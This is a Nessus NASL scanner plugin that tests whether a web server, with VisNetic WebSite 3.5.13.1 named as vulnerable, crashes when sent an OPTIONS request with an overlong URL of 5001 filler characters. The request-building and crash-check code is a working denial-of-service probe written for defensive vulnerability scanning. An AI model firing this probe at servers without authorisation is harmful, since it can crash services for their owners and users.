#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# Some vulnerable servers:
# VisNetic WebSite 3.5.13.1
# 
# 
########################
# References:
########################
#
# Date: Fri, 13 Dec 2002 09:25:00 +0100
# From:"Peter Kruse" <kruse@KRUSESECURITY.DK>
# Subject: VisNetic WebSite Denial of Service
# To:NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#
########################

if(description)
{
 script_id(11235);
 script_version ("$Revision: 1.4 $");
 #script_bugtraq_id(2979);
 #script_cve_id("CVE-2000-0002");
 
 name["english"] = "Too long OPTIONS parameter";
 name["francais"] = "Paramètre d'OPTIONS trop long";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It may be possible to make the web server crash or even 
execute arbitrary code by sending it a too long url through
the OPTIONS method.

Risk factor : High

Solution : Upgrade your web server.";

 desc["francais"] = "
 Il est possible de tuer faire exécuter du code arbitraire
au serveur web en lui envoyant une URL trop longue via la
méthode OPTIONS.

Facteur de risque : Elevé

Solution : Mettez à jour votre serveur web.";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Web server OPTIONS buffer overflow";
 summary["francais"] = "Dépassement de buffer sur OPTIONS dans un serveur web";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL); 
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi",
		francais:"Ce script est Copyright (C) 2003 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
  script_require_ports("Services/www",80);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

# We need a simple http_request function. However, for NASL1, let's do this:
req = http_get(port: port, item: string("/", crap(5001), ".html"));
req = ereg_replace(string: req, pattern:"^GET", replace: "OPTIONS");
send(socket:soc, data:req);
http_recv(socket: soc);
http_close_socket(soc);

if(http_is_dead(port: port))
{
  security_hole(port);
  # set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
